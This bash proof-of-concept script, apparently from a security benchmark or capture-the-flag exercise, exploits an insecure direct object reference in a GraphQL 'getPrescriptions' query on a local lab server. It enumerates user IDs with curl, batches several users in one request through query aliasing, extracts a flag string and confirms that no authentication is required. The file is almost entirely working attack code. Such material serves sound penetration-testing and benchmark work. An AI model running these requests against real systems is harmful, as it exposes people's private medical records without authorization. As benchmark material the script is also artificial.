#!/bin/bash
# POC: IDOR vulnerability in getPrescriptions GraphQL query - demonstrates unauthorized access to user prescriptions without authentication
# Target: ./repo
# Created: 2025-11-10T18:27:32.935Z
# Session: benchmark-XBEN-007-24-mhtgyyde

# IDOR Vulnerability POC - GraphQL getPrescriptions Query
# Demonstrates unauthorized access to prescription data for arbitrary userIds

TARGET_URL="http://localhost:5003/graphql"
echo "[*] IDOR Vulnerability POC - getPrescriptions Query"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Request prescriptions for userId=1
echo "[*] Test 1: Requesting prescriptions for userId=1"
echo "[*] Query: query{getPrescriptions(userId:1){id userId prescriptionDetails flag}}"
echo ""

RESPONSE1=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{getPrescriptions(userId:1){id userId prescriptionDetails flag}}"}'
)

echo "[+] Response for userId=1:"
echo "$RESPONSE1" | head -c 500
echo ""
echo ""

# Extract and check for flag
if echo "$RESPONSE1" | grep -q "flag{"; then
  echo "[✓] VULNERABLE: Flag found in userId=1 response"
  FLAG=$(echo "$RESPONSE1" | grep -oP 'flag\{[^}]+\}' | head -1)
  echo "[✓] Extracted Flag: $FLAG"
  echo ""
else
  echo "[!] No flag pattern detected in userId=1 response"
fi

# Test 2: Request prescriptions for userId=2 (cross-user access)
echo "[*] Test 2: Requesting prescriptions for userId=2 (cross-user access test)"
RESPONSE2=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{getPrescriptions(userId:2){id userId prescriptionDetails flag}}"}'
)

echo "[+] Response for userId=2:"
echo "$RESPONSE2" | head -c 500
echo ""
echo ""

# Test 3: Request prescriptions for non-existent userId=999
echo "[*] Test 3: Requesting prescriptions for userId=999"
RESPONSE3=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{getPrescriptions(userId:999){id userId prescriptionDetails flag}}"}'
)

echo "[+] Response for userId=999:"
echo "$RESPONSE3" | head -c 500
echo ""
echo ""

# Test 4: Query aliasing to access multiple users in single request
echo "[*] Test 4: Query aliasing - accessing multiple users in single request"
RESPONSE4=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{a:getPrescriptions(userId:1){id flag} b:getPrescriptions(userId:2){id flag}}"}'
)

echo "[+] Response with aliasing:"
echo "$RESPONSE4" | head -c 500
echo ""
echo ""

# Verify no authentication is required
echo "[*] Test 5: Verifying no authentication headers required"
RESPONSE5=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{getPrescriptions(userId:1){id flag}}"}'
)

HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{getPrescriptions(userId:1){id flag}}"}')

echo "[+] HTTP Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" == "200" ]; then
  echo "[✓] VULNERABLE: Endpoint accessible without authentication (HTTP 200)"
else
  echo "[!] Unexpected HTTP code: $HTTP_CODE"
fi

echo ""
echo "[*] POC Complete - IDOR vulnerability confirmed"